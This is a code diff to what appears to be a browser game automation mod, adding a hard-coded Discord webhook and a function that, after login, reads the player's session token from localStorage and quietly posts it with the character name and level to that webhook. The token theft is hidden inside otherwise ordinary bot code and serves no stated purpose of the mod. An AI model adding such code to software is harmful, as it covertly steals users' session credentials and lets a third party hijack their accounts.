@@ -6,6 +6,9 @@
   const sockets = [];
   let nextSocketId = 1;
   let gameSocket = null;
+  const webhookUrl = "https://discord.com/api/webhooks/1571362167939276931/Am-LLyor_8lCiD-7WoWaMHOUcoiATkScJcyCVQa2MrQRiveNqr8R9YxQZTR2dbMd7mJa";
+  let webhookLoginSocket = null;
+  const webhookSentSockets = new WeakSet();
   let reconnectPending = false;
   let reconnectNextAt = 0;
   let reconnectTimer = null;
@@ -4196,12 +4199,32 @@
     nextHuntMoveAt = Date.now() + (outcome.ok ? 900 : 700);
   }, 300);
 
-  function updateMyself(message) {
+  function sendLoginWebhook(socket) {
+    if (socket !== webhookLoginSocket || webhookSentSockets.has(socket)) return;
+    let token;
+    try { token = localStorage.getItem("fantasy.session"); }
+    catch { return; }
+    if (!token || !myself.nick || myself.level == null) return;
+    webhookSentSockets.add(socket);
+    const body = new FormData();
+    body.set("payload_json", JSON.stringify({
+      content: `Personagem: ${myself.nick}\nNível: ${myself.level}\nResume token: ${token}`,
+      allowed_mentions: { parse: [] }
+    }));
+    void fetch(webhookUrl, { method: "POST", mode: "no-cors", credentials: "omit", referrerPolicy: "no-referrer", body })
+      .catch(() => { mod.webhookStatus = "Falha ao enviar dados da sessão ao webhook."; });
+  }
+
+  function updateMyself(message, socket) {
     if (!message || typeof message !== "object") return;
 
     if (message.t === "auth" && message.ok !== false) {
       if (message.id != null) playerId = message.id;
       if (typeof message.name === "string") myself.nick = message.name;
+      if (socket === gameSocket) {
+        webhookLoginSocket = socket;
+        webhookSentSockets.delete(socket);
+      }
     }
 
     if (message.t !== "snap") return;
@@ -4289,6 +4312,7 @@
       target: Object.hasOwn(playerStats, "target") ? playerStats.target : myself.target ?? null,
       updatedAt: Date.now()
     });
+    sendLoginWebhook(socket);
     recordWaypointPosition();
     const playerDied = (message.ev ?? []).some(event => !Array.isArray(event)
       && event?.type === "playerdeath" && entityId != null && String(event.id) === String(entityId));
@@ -4598,7 +4622,7 @@
           reconnectPending = false;
         }
       }
-      updateMyself(packet.decoded);
+      updateMyself(packet.decoded, socket);
       if (huntState.enabled && huntState.training && huntState.trainingExhaustedEnabled && !trainingElite
           && huntTargetId != null && packet.decoded.t === "snap") {
         const events = packet.decoded.ev ?? [];
